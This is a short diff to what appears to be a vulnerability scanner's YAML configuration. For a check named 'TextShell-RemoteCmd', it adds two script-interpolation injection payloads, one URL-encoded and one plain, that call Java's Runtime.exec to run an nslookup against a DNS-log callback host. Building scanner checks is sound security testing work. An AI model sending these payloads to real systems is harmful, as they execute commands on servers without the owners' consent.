@@ -183,7 +183,8 @@ application:
       # 漏洞名称
       issueName: "TextShell-RemoteCmd"
       payloads:
-        - "${dns:address|dns-url}"
+        - "%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup+dns-url%27%29%7D"
+        - "${script:javascript:java.lang.Runtime.getRuntime().exec('nslookup dns-url')}"
 # dnsLog模块
 dnsLogModule:
   # 提供商
